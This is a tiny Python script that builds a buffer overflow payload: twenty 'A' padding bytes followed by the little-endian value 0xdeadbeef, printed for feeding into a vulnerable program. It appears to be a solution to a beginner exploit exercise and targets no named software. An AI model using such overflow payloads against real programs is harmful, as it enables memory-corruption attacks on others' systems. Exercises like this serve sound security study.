#!/usr/bin/env python

from struct import pack

payload = 'A' * 20 
new_val = pack('<L', 0xdeadbeef)

print(payload + new_val.decode('latin-1'))
